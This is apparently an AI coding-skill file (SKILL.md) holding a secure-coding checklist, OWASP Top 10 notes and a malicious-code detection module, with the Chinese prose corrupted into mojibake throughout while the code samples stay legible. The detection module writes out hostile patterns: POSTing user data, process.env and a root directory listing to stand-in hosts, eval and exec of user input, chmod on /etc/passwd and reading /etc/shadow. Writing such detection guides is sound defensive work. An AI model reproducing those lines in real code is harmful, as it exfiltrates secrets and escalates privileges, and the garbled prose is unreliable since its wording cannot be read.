---
name: code-security-check
description: >
  浠ｇ爜瀹夊叏妫€鏌ユ妧鑳?鈥?鏉板厠涓撶敤鐨勫畨鍏ㄦ壂鎻忓伐鍏枫€?  娑电洊锛欰) 浠ｇ爜瀹夊叏妫€鏌ユ竻鍗?B) 鎭舵剰浠ｇ爜妫€娴?C) 瀹夊叏缂栫▼瑙勮寖
  閫傜敤鍦烘櫙锛?  - 鍐欏畬浠ｇ爜鍚庯紝杩涜瀹夊叏妫€鏌?  - 瀹℃煡绗笁鏂逛唬鐮?  - 瀛︿範瀹夊叏缂栫▼鐭ヨ瘑
  瑙﹀彂鏃舵満锛氫换浣曚唬鐮佸啓鍏ユ搷浣滃畬鎴愬悗銆?  杩欐槸缁?Claude 鑷繁鐢ㄧ殑瀹夊叏妫€鏌ュ伐鍏凤紝涓嶆槸 OpenClaw 鎶€鑳姐€?---

# 浠ｇ爜瀹夊叏妫€鏌?(Code Security Check)

> **鍘熷垯**锛氬畨鍏ㄦ棤灏忎簨锛岄闃茶儨浜庢不鐤楋紒
>
> **鐩爣**锛氳姣忎竴琛屼唬鐮侀兘缁忓緱璧峰畨鍏ㄥ鏌ワ紒

---

## 馃搵 涓夊ぇ妫€鏌ユā鍧?
```
鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹? Module A: 浠ｇ爜瀹夊叏妫€鏌ユ竻鍗?                             鈹?鈹? 鈫?姣忔鍐欎唬鐮佸悗蹇呴』杩囩殑妫€鏌ヨ〃                            鈹?鈹溾攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹? Module B: 鎭舵剰浠ｇ爜妫€娴?                                 鈹?鈹? 鈫?璇嗗埆鍙枒浠ｇ爜妯″紡锛岄槻姝㈡棤蹇冧箣澶?                       鈹?鈹溾攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹? Module C: 瀹夊叏缂栫▼瑙勮寖                                  鈹?鈹? 鈫?OWASP Top 10 + 瀹夊叏缂栫爜鏈€浣冲疄璺?                      鈹?鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?```

---

## 馃敀 Module A: 浠ｇ爜瀹夊叏妫€鏌ユ竻鍗?
### A1. 鏁忔劅淇℃伅妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鏈夌‖缂栫爜鐨勫瘑鐮佸悧锛?- [ ] 鏈夌‖缂栫爜鐨?API 瀵嗛挜鍚楋紵
- [ ] 鏈夌‖缂栫爜鐨?Token 鍚楋紵
- [ ] 鏈夌‖缂栫爜鐨勬暟鎹簱杩炴帴瀛楃涓插悧锛?- [ ] 鏈夊啓姝荤殑绉佷汉淇℃伅锛堥偖绠便€佹墜鏈哄彿锛夊悧锛?
**鍗遍櫓淇″彿**锛?```javascript
// 鉂?鍗遍櫓
const password = "admin123";
const apiKey = "sk-REDACTED";
const dbUrl = "mysql://root:password@localhost/mydb";

// 鉁?瀹夊叏
const password = process.env.DB_PASSWORD;
const apiKey = process.env.API_KEY;
const dbUrl = process.env.DATABASE_URL;
```

---

### A2. 娉ㄥ叆婕忔礊妫€鏌?
**SQL 娉ㄥ叆**锛?- [ ] 鏈夊瓧绗︿覆鎷兼帴 SQL 鍚楋紵
- [ ] 鐢ㄦ埛杈撳叆鐩存帴杩涘叆鏌ヨ鍚楋紵
- [ ] 鐢ㄤ簡鍙傛暟鍖栨煡璇㈠悧锛?
```javascript
// 鉂?鍗遍櫓 - SQL 娉ㄥ叆
const sql = `SELECT * FROM users WHERE id = ${userId}`;
db.query(sql);

// 鉁?瀹夊叏 - 鍙傛暟鍖栨煡璇?const sql = 'SELECT * FROM users WHERE id = ?';
db.query(sql, [userId]);
```

**鍛戒护娉ㄥ叆**锛?- [ ] 鏈夊瓧绗︿覆鎷兼帴 shell 鍛戒护鍚楋紵
- [ ] 鐢ㄦ埛杈撳叆鐩存帴杩?exec 鍚楋紵
- [ ] 鐢ㄤ簡瀹夊叏鐨?API 鍚楋紵

```javascript
// 鉂?鍗遍櫓 - 鍛戒护娉ㄥ叆
const filename = userInput;
exec(`cat ${filename}`);

// 鉁?瀹夊叏 - 浣跨敤 API
const filename = userInput;
fs.readFile(filename, callback);
```

**XSS锛堣法绔欒剼鏈級**锛?- [ ] 鐢ㄦ埛杈撳叆鐩存帴杈撳嚭鍒?HTML 鍚楋紵
- [ ] 鏈夌敤 innerHTML 鍚楋紵
- [ ] 鏈夎浆涔夌壒娈婂瓧绗﹀悧锛?
```javascript
// 鉂?鍗遍櫓 - XSS
element.innerHTML = userInput;

// 鉁?瀹夊叏 - 杞箟鎴栦娇鐢?textContent
element.textContent = userInput;
// 鎴栦娇鐢ㄨ浆涔夊嚱鏁?element.innerHTML = escapeHtml(userInput);
```

---

### A3. 璺緞閬嶅巻妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鐢ㄦ埛杈撳叆鐩存帴鐢ㄤ簬鏂囦欢璺緞鍚楋紵
- [ ] 鏈夐獙璇佹枃浠跺湪鍏佽鐨勭洰褰曞唴鍚楋紵
- [ ] 鏈夊鐞?../ 鏀诲嚮鍚楋紵

```javascript
// 鉂?鍗遍櫓 - 璺緞閬嶅巻
const filePath = `/uploads/${userFilename}`;
fs.readFile(filePath);

// 鉁?瀹夊叏 - 楠岃瘉璺緞
const safePath = path.resolve('/uploads', path.basename(userFilename));
if (!safePath.startsWith('/uploads/')) throw new Error('Invalid path');
fs.readFile(safePath);
```

---

### A4. 璁よ瘉鎺堟潈妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鏈夐獙璇佺敤鎴疯韩浠藉悧锛?- [ ] 鏈夋鏌ョ敤鎴锋潈闄愬悧锛?- [ ] Token 楠岃瘉浜嗗悧锛?- [ ] Session 杩囨湡鏃堕棿璁剧疆浜嗗悧锛?
```javascript
// 鉂?鍗遍櫓 - 鏃犺璇?function getUserData(userId) {
  return db.query('SELECT * FROM users WHERE id = ?', [userId]);
}

// 鉁?瀹夊叏 - 楠岃瘉韬唤鍜屾潈闄?function getUserData(currentUserId, targetUserId) {
  if (currentUserId !== targetUserId) {
    throw new Error('鏃犳潈璁块棶');
  }
  return db.query('SELECT * FROM users WHERE id = ?', [targetUserId]);
}
```

---

### A5. 鏁版嵁楠岃瘉妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鎵€鏈夌敤鎴疯緭鍏ラ兘楠岃瘉浜嗗悧锛?- [ ] 鏈夌被鍨嬫鏌ュ悧锛?- [ ] 鏈夐暱搴﹂檺鍒跺悧锛?- [ ] 鏈夋牸寮忛獙璇佸悧锛堥偖绠便€佹墜鏈哄彿锛夛紵

```javascript
// 鉂?鍗遍櫓 - 鏃犻獙璇?function createUser(data) {
  return db.insert('users', data);
}

// 鉁?瀹夊叏 - 鍏ㄩ潰楠岃瘉
function createUser(data) {
  // 绫诲瀷妫€鏌?  if (typeof data.username !== 'string') throw new Error('鐢ㄦ埛鍚嶅繀椤绘槸瀛楃涓?);

  // 闀垮害闄愬埗
  if (data.username.length > 50) throw new Error('鐢ㄦ埛鍚嶅お闀?);

  // 鏍煎紡楠岃瘉
  if (!isValidEmail(data.email)) throw new Error('閭鏍煎紡閿欒');

  // 鐧藉悕鍗曡繃婊?  const allowedFields = ['username', 'email', 'password'];
  const sanitized = Object.keys(data)
    .filter(k => allowedFields.includes(k))
    .reduce((obj, k) => ({ ...obj, [k]: data[k] }), {});

  return db.insert('users', sanitized);
}
```

---

### A6. 閿欒澶勭悊妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鏈夋崟鑾峰紓甯稿悧锛?- [ ] 閿欒淇℃伅浼氭毚闇叉晱鎰熶俊鎭悧锛?- [ ] 鏈夋棩蹇楄褰曞悧锛?- [ ] 鏈夌粺涓€鐨勯敊璇搷搴旀牸寮忓悧锛?
```javascript
// 鉂?鍗遍櫓 - 鏆撮湶鏁忔劅淇℃伅
try {
  db.query(sql);
} catch (e) {
  res.send(`鏁版嵁搴撻敊璇細${e.message} - SQL: ${sql}`);
}

// 鉁?瀹夊叏 - 闅愯棌鏁忔劅淇℃伅
try {
  db.query(sql);
} catch (e) {
  logger.error('鏁版嵁搴撴煡璇㈠け璐?, { error: e.message, userId });
  res.status(500).json({ error: 'INTERNAL_ERROR', message: '鏈嶅姟鍣ㄥ唴閮ㄩ敊璇? });
}
```

---

### A7. 鏃ュ織瀹夊叏妾㈡煡

**妫€鏌ラ」**锛?- [ ] 鏃ュ織閲屾湁瀵嗙爜鍚楋紵
- [ ] 鏃ュ織閲屾湁 Token 鍚楋紵
- [ ] 鏃ュ織閲屾湁瀹屾暣淇＄敤鍗″彿鍚楋紵
- [ ] 鏃ュ織閲屾湁韬唤璇佸彿鍚楋紵

```javascript
// 鉂?鍗遍櫓 - 璁板綍鏁忔劅淇℃伅
logger.info('鐢ㄦ埛鐧诲綍', { password: user.password, token });

// 鉁?瀹夊叏 - 鑴辨晱璁板綍
logger.info('鐢ㄦ埛鐧诲綍', { userId: user.id, timestamp: Date.now() });
```

---

### A8. 渚濊禆瀹夊叏妫€鏌?
**妫€鏌ラ」**锛?- [ ] 渚濊禆閮芥槸瀹樻柟婧愬悧锛?- [ ] 鏈変弗閲嶆紡娲炵殑渚濊禆鍚楋紵
- [ ] 渚濊禆鐗堟湰閿佸畾浜嗗悧锛?
```bash
# 妫€鏌ユ紡娲?npm audit
npx audit-ci

# 妫€鏌ヨ繃鏃剁殑渚濊禆
npm outdated

# 閿佸畾鐗堟湰
package-lock.json / yarn.lock 蹇呴』鎻愪氦
```

---

### A9. 鏂囦欢涓婁紶妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鏈夐獙璇佹枃浠剁被鍨嬪悧锛?- [ ] 鏈夊ぇ灏忛檺鍒跺悧锛?- [ ] 鏂囦欢鍚嶅畨鍏ㄥ鐞嗕簡鍚楋紵
- [ ] 瀛樺偍鐩綍鍙墽琛岃剼鏈悧锛?
```javascript
// 鉂?鍗遍櫓 - 鏃犻獙璇?app.post('/upload', (req, res) => {
  const file = req.files.file;
  file.mv(`/uploads/${file.name}`);
});

// 鉁?瀹夊叏 - 鍏ㄩ潰妫€鏌?app.post('/upload', (req, res) => {
  const file = req.files.file;

  // 妫€鏌ユ枃浠剁被鍨嬶紙鐧藉悕鍗曪級
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (!allowedTypes.includes(file.mimetype)) {
    return res.status(400).json({ error: '涓嶆敮鎸佺殑鏂囦欢绫诲瀷' });
  }

  // 妫€鏌ユ枃浠跺ぇ灏忥紙10MB 闄愬埗锛?  if (file.size > 10 * 1024 * 1024) {
    return res.status(400).json({ error: '鏂囦欢澶ぇ' });
  }

  // 瀹夊叏鏂囦欢鍚?  const safeName = `${Date.now()}-${path.basename(file.name)}`;
  const uploadPath = path.resolve('/uploads/images', safeName);

  file.mv(uploadPath);
});
```

---

### A10. API 瀹夊叏妫€鏌?
**妫€鏌ラ」**锛?- [ ] 鏈夐€熺巼闄愬埗鍚楋紵
- [ ] 鏈?CORS 閰嶇疆鍚楋紵
- [ ] 鏈夎姹備綋澶у皬闄愬埗鍚楋紵
- [ ] 鏈夎緭鍏ラ獙璇佸悧锛?
```javascript
// 鉁?瀹夊叏閰嶇疆
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 鍒嗛挓
  max: 100 // 鏈€澶?100 涓姹?}));

app.use(cors({
  origin: process.env.ALLOWED_ORIGINS,
  credentials: true
}));

app.use(express.json({ limit: '10mb' }));
```

---

## 馃毃 Module B: 鎭舵剰浠ｇ爜妫€娴?
### B1. 鍙枒鐨勫閮ㄨ姹?
**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 璀︽儠 - 闅愯棌鐨勬暟鎹鍙?fetch('http://unknown-server.com/log', {
  method: 'POST',
  body: JSON.stringify(userData)
});

// 鈿狅笍 璀︽儠 - 濂囨€殑 API 璋冪敤
const response = await axios.post('http://xxx.com/collect', {
  env: process.env,
  files: fs.readdirSync('/')
});
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈夎姹傚埌涓嶆槑鍩熷悕鍚楋紵
- [ ] 鏈夊彂閫佹晱鎰熸暟鎹埌澶栭儴鍚楋紵
- [ ] 鍩熷悕鏄‖缂栫爜鐨勫悧锛?- [ ] 璇锋眰鏄繀瑕佺殑鍚楋紵

---

### B2. 鍗遍櫓鐨勬墽琛屽嚱鏁?
**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 鍗遍櫓 - eval
eval(userInput);

// 鈿狅笍 鍗遍櫓 - Function 鏋勯€?new Function(userInput)();

// 鈿狅笍 鍗遍櫓 - child_process
exec(userInput);
spawn(userInput, { shell: true });

// 鈿狅笍 鍗遍櫓 - vm 妯″潡
vm.runInNewContext(userInput);
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈変娇鐢?eval 鍚楋紵
- [ ] 鏈変娇鐢?Function 鏋勯€犲櫒鍚楋紵
- [ ] 鏈夋墽琛?shell 鍛戒护鍚楋紵
- [ ] 鐢ㄦ埛杈撳叆鑳藉奖鍝嶆墽琛屽唴瀹瑰悧锛?
---

### B3. 闅愯棌鐨勫畾鏃堕€昏緫

**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 璀︽儠 - 寤惰繜鎵ц鐨勫彲鐤戜唬鐮?setTimeout(() => {
  sendUserDataToExternalServer();
}, 60000);

// 鈿狅笍 璀︽儠 - 鏉′欢瑙﹀彂鐨勯殣钘忛€昏緫
if (new Date().getHours() === 3) {
  executeHiddenTask();
}
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈?setTimeout/setInterval 鍚楋紵
- [ ] 鏈夊熀浜庢椂闂寸殑鏉′欢閫昏緫鍚楋紵
- [ ] 鏈夐殣钘忕殑鍥炶皟鍑芥暟鍚楋紵
- [ ] 閫昏緫鐨勭洰鐨勬槸浠€涔堬紵

---

### B4. 寮傚父鐨勬潈闄愯姹?
**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 璀︽儠 - 璇锋眰杩囬珮鏉冮檺
fs.chmod('/etc/passwd', 0o777);
process.setuid(0);

// 鈿狅笍 璀︽儠 - 璁块棶鏁忔劅璺緞
fs.readFileSync('/etc/shadow');
fs.readdirSync('C:/Windows/System32');
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈変慨鏀圭郴缁熸枃浠跺悧锛?- [ ] 鏈夎闂晱鎰熺洰褰曞悧锛?- [ ] 鏈夋彁鍗囨潈闄愬悧锛?- [ ] 鏉冮檺鏄繀瑕佺殑鍚楋紵

---

### B5. 鏁版嵁娣锋穯妫€娴?
**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 璀︽儠 - Base64 缂栫爜鐨勫彲鐤戞暟鎹?const payload = Buffer.from('c2VjcmV0IGRhdGE=', 'base64').toString();

// 鈿狅笍 璀︽儠 - 鍗佸叚杩涘埗缂栫爜
const code = Buffer.from('636f6e736f6c652e6c6f67282768656c6c6f2729', 'hex').toString();

// 鈿狅笍 璀︽儠 - 瀛楃涓叉媶鍒嗙粫杩囨娴?const fn = 'ev'.split('').reverse().join('');
window[fn](maliciousCode);
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈?Base64 缂栫爜鐨勫瓧绗︿覆鍚楋紵
- [ ] 鏈夊崄鍏繘鍒剁紪鐮佸悧锛?- [ ] 鏈夊姩鎬佹嫾鎺ュ嚱鏁板悕鍚楋紵
- [ ] 瑙ｇ爜鍚庣殑鍐呭鏄粈涔堬紵

---

### B6. 鍘熷瀷姹℃煋妫€娴?
**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 鍗遍櫓 - 鐩存帴鍚堝苟鐢ㄦ埛杈撳叆
Object.assign(target, userInput);

// 鈿狅笍 鍗遍櫓 - 娣卞害鍚堝苟鏃犱繚鎶?_.merge(target, userInput);

// 鉁?瀹夊叏 - 浣跨敤 Object.create(null)
const safeObj = Object.create(null);
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈夊悎骞剁敤鎴疯緭鍏ュ悧锛?- [ ] 鏈夐獙璇?__proto__ 鍚楋紵
- [ ] 浣跨敤浜嗗畨鍏ㄧ殑搴撳悧锛?
---

### B7. 鍙嶅簭鍒楀寲婕忔礊

**妫€娴嬫ā寮?*锛?```javascript
// 鈿狅笍 鍗遍櫓 - 鍙嶅簭鍒楀寲鐢ㄦ埛鏁版嵁
const obj = JSON.parse(userInput);
// 鍦ㄦ煇浜涘簱涓彲鑳借Е鍙戝師鍨嬫薄鏌?
// 鈿狅笍 鍗遍櫓 - 浣跨敤涓嶅畨鍏ㄧ殑鍙嶅簭鍒楀寲
deserialize(userInput);
```

**妫€鏌ユ竻鍗?*锛?- [ ] 鏈夊弽搴忓垪鍖栫敤鎴疯緭鍏ュ悧锛?- [ ] 浣跨敤浜嗗畨鍏ㄧ殑鍙嶅簭鍒楀寲搴撳悧锛?- [ ] 鏈夐獙璇佸弽搴忓垪鍖栫粨鏋滃悧锛?
---

## 馃摎 Module C: 瀹夊叏缂栫▼瑙勮寖

### C1. OWASP Top 10 闃叉姢

#### 1. 娉ㄥ叆 (Injection)
```
椋庨櫓锛歋QL銆丯oSQL銆丱S 鍛戒护銆丩DAP 娉ㄥ叆
闃叉姢锛?- 浣跨敤鍙傛暟鍖栨煡璇?- 浣跨敤 ORM
- 杈撳叆楠岃瘉鍜岃浆涔?- 鏈€灏忔潈闄愬師鍒?```

#### 2. 澶辨晥鐨勮韩浠借璇?(Broken Authentication)
```
椋庨櫓锛氫細璇濆浐瀹氥€佸嚟璇佸～鍏呫€佹毚鍔涚牬瑙?闃叉姢锛?- 寮哄瘑鐮佺瓥鐣?- 澶氬洜绱犺璇?- 浼氳瘽瓒呮椂
- 澶辫触娆℃暟闄愬埗
```

#### 3. 鏁忔劅鏁版嵁娉勯湶 (Sensitive Data Exposure)
```
椋庨櫓锛氭槑鏂囧瓨鍌ㄥ瘑鐮併€佷紶杈撴湭鍔犲瘑
闃叉姢锛?- 鍔犲瘑瀛樺偍锛坆crypt銆乤rgon2锛?- HTTPS 浼犺緭
- 涓嶈褰曟晱鎰熶俊鎭?- 鏁版嵁鑴辨晱
```

#### 4. XML 澶栭儴瀹炰綋 (XXE)
```
椋庨櫓锛氳鍙栨湰鍦版枃浠躲€丼SRF銆丏oS
闃叉姢锛?- 绂佺敤 DTD
- 绂佺敤澶栭儴瀹炰綋
- 浣跨敤 JSON 鏇夸唬 XML
```

#### 5. 澶辨晥鐨勮闂帶鍒?(Broken Access Control)
```
椋庨櫓锛氳秺鏉冭闂€佺洰褰曢亶鍘?闃叉姢锛?- 鏈嶅姟绔潈闄愰獙璇?- 鏈€灏忔潈闄愬師鍒?- 缁熶竴鐨勮闂帶鍒跺眰
```

#### 6. 瀹夊叏閰嶇疆閿欒 (Security Misconfiguration)
```
椋庨櫓锛氶粯璁ら厤缃€佽缁嗛敊璇俊鎭€佹湭浣跨敤鍔熻兘
闃叉姢锛?- 鍒犻櫎榛樿璐︽埛
- 鍏抽棴璇︾粏閿欒
- 绂佺敤鏈娇鐢ㄥ姛鑳?- 瀹氭湡瀹夊叏鎵弿
```

#### 7. 璺ㄧ珯鑴氭湰 (XSS)
```
椋庨櫓锛氱獌鍙栦細璇濄€侀噸瀹氬悜銆侀敭鐩樿褰?闃叉姢锛?- 杈撳嚭缂栫爜
- Content-Security-Policy
- 浣跨敤妗嗘灦鐨勮嚜鍔ㄨ浆涔?- HttpOnly Cookie
```

#### 8. 涓嶅畨鍏ㄧ殑鍙嶅簭鍒楀寲 (Insecure Deserialization)
```
椋庨櫓锛氳繙绋嬩唬鐮佹墽琛屻€佹潈闄愭彁鍗?闃叉姢锛?- 閬垮厤鍙嶅簭鍒楀寲鐢ㄦ埛鏁版嵁
- 浣跨敤绛惧悕楠岃瘉瀹屾暣鎬?- 闄愬埗鍙嶅簭鍒楀寲鐨勭被
```

#### 9. 浣跨敤鍚湁婕忔礊鐨勭粍浠?(Vulnerable Components)
```
椋庨櫓锛氬凡鐭ユ紡娲炶鍒╃敤
闃叉姢锛?- 瀹氭湡鏇存柊渚濊禆
- 浣跨敤 SCA 宸ュ叿鎵弿
- 绉婚櫎涓嶅繀瑕佺殑渚濊禆
```

#### 10. 涓嶈冻鐨勬棩蹇楄褰曞拰鐩戞帶 (Insufficient Logging & Monitoring)
```
椋庨櫓锛氭敾鍑绘棤娉曡拷婧€佸搷搴斿欢杩?闃叉姢锛?- 璁板綍鎵€鏈夊畨鍏ㄤ簨浠?- 璁剧疆鍛婅闃堝€?- 瀹氭湡瀹¤鏃ュ織
- 涓?SIEM 闆嗘垚
```

---

### C2. 瀹夊叏缂栫爜鏈€浣冲疄璺?
#### 瀵嗙爜瀛樺偍
```javascript
// 鉁?浣跨敤 bcrypt
const bcrypt = require('bcrypt');
const saltRounds = 12;
const hash = await bcrypt.hash(password, saltRounds);
const valid = await bcrypt.compare(password, hash);

// 鉂?绂佹
const hash = md5(password);  // 澶急
const hash = sha256(password);  // 鏃犵洂锛屽お寮?```

#### Token 鐢熸垚
```javascript
// 鉁?浣跨敤 crypto 鐢熸垚瀹夊叏闅忔満鏁?const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');

// 鉂?绂佹
const token = Math.random().toString();  // 鍙娴?const token = 'fixed-token';  // 纭紪鐮?```

#### HTTPS 閰嶇疆
```javascript
// 鉁?寮哄埗 HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

// 鉁?HSTS
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
```

#### Cookie 瀹夊叏
```javascript
// 鉁?瀹夊叏閰嶇疆
res.cookie('session', token, {
  httpOnly: true,      // 绂佹 JS 璁块棶
  secure: true,        // 浠?HTTPS
  sameSite: 'strict',  // 闃叉 CSRF
  maxAge: 3600000      // 1 灏忔椂杩囨湡
});

// 鉂?鍗遍櫓
res.cookie('session', token);  // 鎵€鏈変繚鎶ら兘娌℃湁
```

---

### C3. 瀹夊叏妫€鏌ラ€熸煡琛?
**鍐欎唬鐮佸墠**锛?- [ ] 杩欎釜鍔熻兘鏈変粈涔堝畨鍏ㄩ闄╋紵
- [ ] 鐢ㄦ埛杈撳叆鍦ㄥ摢閲岋紵
- [ ] 鏁忔劅鏁版嵁鏈夊摢浜涳紵

**鍐欎唬鐮佹椂**锛?- [ ] 鐢ㄤ簡鍙傛暟鍖栨煡璇㈠悧锛?- [ ] 杈撳叆楠岃瘉浜嗗悧锛?- [ ] 閿欒浼氭毚闇叉晱鎰熶俊鎭悧锛?- [ ] 鏃ュ織璁板綍瀹夊叏鍚楋紵

**鍐欎唬鐮佸悗**锛?- [ ] 杩囦竴閬?Module A 妫€鏌ユ竻鍗?- [ ] 杩囦竴閬?Module B 鎭舵剰妫€娴?- [ ] 瀵圭収 Module C 鏈€浣冲疄璺?
**涓婄嚎鍓?*锛?- [ ] npm audit 鎵弿渚濊禆
- [ ] 娓楅€忔祴璇?- [ ] 浠ｇ爜瀹℃煡
- [ ] 瀹夊叏鎵弿宸ュ叿

---

## 馃洜锔?浣跨敤娴佺▼

### 鍦烘櫙 1锛氬啓瀹屼唬鐮佸悗鑷

```
1. 杩愯 Module A 妫€鏌ユ竻鍗曪紙閫愰」瀵圭収锛?   鈫?2. 杩愯 Module B 鎭舵剰妫€娴嬶紙鎺掓煡鍙枒妯″紡锛?   鈫?3. 鍙戠幇闂 鈫?淇 鈫?閲嶆柊妫€鏌?   鈫?4. 鍏ㄩ儴閫氳繃 鈫?鎻愪氦浠ｇ爜
```

### 鍦烘櫙 2锛氬鏌ョ涓夋柟浠ｇ爜

```
1. 鍏堣繍琛?Module B 鎭舵剰妫€娴嬶紙鎺掗櫎鏄庢樉鍗遍櫓锛?   鈫?2. 鍐嶈繍琛?Module A 妫€鏌ユ竻鍗曪紙閫愰」瀹℃煡锛?   鈫?3. 瀵圭収 Module C 璇勪及瀹夊叏姘村钩
   鈫?4. 杈撳嚭瀹℃煡鎶ュ憡 + 淇寤鸿
```

### 鍦烘櫙 3锛氬涔犲畨鍏ㄧ紪绋?
```
1. 闃呰 Module C 瀹夊叏瑙勮寖
   鈫?2. 鐞嗚В姣忎釜椋庨櫓鐐圭殑鍘熺悊
   鈫?3. 鍦?Module A/B 涓壘鍒板搴旀鏌ラ」
   鈫?4. 鍦ㄥ疄闄呬唬鐮佷腑缁冧範
```

---

## 馃搳 瀹夊叏绛夌骇鍒嗙被

| 绛夌骇 | 鏍囪瘑 | 鍚箟 | 琛屽姩 |
|------|------|------|------|
| Critical | 馃敶 | 涓ラ噸婕忔礊锛岀珛鍗充慨澶?| 鍋滄鎵€鏈夊伐浣滐紝绔嬪埢淇 |
| High | 馃煚 | 楂橀闄╋紝闇€瑕佸叧娉?| 灏藉揩淇锛屼笉鑳戒笂绾?|
| Medium | 馃煛 | 涓瓑椋庨櫓锛屽缓璁慨澶?| 鎺掓湡淇 |
| Low | 馃煝 | 浣庨闄╋紝鍙帴鍙?| 璁板綍锛屽悗缁紭鍖?|

---

## 馃摑 瀹夊叏妫€鏌ユ姤鍛婃ā鏉?
```markdown
# 浠ｇ爜瀹夊叏妫€鏌ユ姤鍛?
**鏃ユ湡**: YYYY-MM-DD
**瀹℃煡浜?*: 鏉板厠
**瀹℃煡鑼冨洿**: [鏂囦欢/妯″潡鍒楄〃]

## 鍙戠幇鐨勯棶棰?
### 馃敶 Critical (0 涓?

### 馃煚 High (0 涓?

### 馃煛 Medium (0 涓?

### 馃煝 Low (0 涓?

## 鏁翠綋璇勪及

**瀹夊叏璇勫垎**: X/100

**涓昏椋庨櫓**:
- ...

**淇寤鸿**:
1. ...
2. ...

## 缁撹

- [ ] 鍙互涓婄嚎
- [ ] 闇€瑕佷慨澶嶅悗涓婄嚎
- [ ] 闇€瑕侀噸澶т慨鏀?```

---

## 馃敆 鐩稿叧鏂囦欢

| 鏂囦欢 | 浣滅敤 |
|------|------|
| [SKILL.md](../code-quality-workflow/SKILL.md) | 浠ｇ爜璐ㄩ噺宸ヤ綔娴侊紙鍖呭惈瀹夊叏閾佸緥锛?|
| [bug-lessons.md](../code-quality-workflow/bug-lessons.md) | Bug 鏁欒璁板綍 |
| [tech-error-log/](../tech-error-log/SKILL.md) | 鎶€鏈敊璇棩蹇?|

---

## 馃挕 浣跨敤绀轰緥

### 绀轰緥锛氱敤鎴风櫥褰曞姛鑳藉畨鍏ㄦ鏌?
**浠ｇ爜**锛?```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // 妫€鏌?1: 杈撳叆楠岃瘉
  if (!username || !password) {
    return res.status(400).json({ error: '缂哄皯鐢ㄦ埛鍚嶆垨瀵嗙爜' });
  }

  // 妫€鏌?2: SQL 鏌ヨ
  const user = await db.query(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );

  if (!user) {
    return res.status(401).json({ error: '鐢ㄦ埛鍚嶆垨瀵嗙爜閿欒' });
  }

  // 妫€鏌?3: 瀵嗙爜楠岃瘉
  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) {
    return res.status(401).json({ error: '鐢ㄦ埛鍚嶆垨瀵嗙爜閿欒' });
  }

  // 妫€鏌?4: 鐢熸垚 Token
  const token = crypto.randomBytes(32).toString('hex');

  // 妫€鏌?5: 璁板綍鏃ュ織锛堜笉璁板綍瀵嗙爜锛?  logger.info('鐢ㄦ埛鐧诲綍鎴愬姛', { userId: user.id, ip: req.ip });

  // 妫€鏌?6: 杩斿洖缁撴灉锛堜笉杩斿洖鏁忔劅淇℃伅锛?  res.json({
    token,
    user: { id: user.id, username: user.username }
  });
});
```

**妫€鏌ョ粨鏋?*锛?```
鉁?杈撳叆楠岃瘉 - 閫氳繃
鉁?SQL 鍙傛暟鍖?- 閫氳繃
鉁?瀵嗙爜 bcrypt - 閫氳繃
鉁?Token 瀹夊叏闅忔満 - 閫氳繃
鉁?鏃ュ織鑴辨晱 - 閫氳繃
鉁?鍝嶅簲鑴辨晱 - 閫氳繃

瀹夊叏璇勫垎锛?00/100
```

---

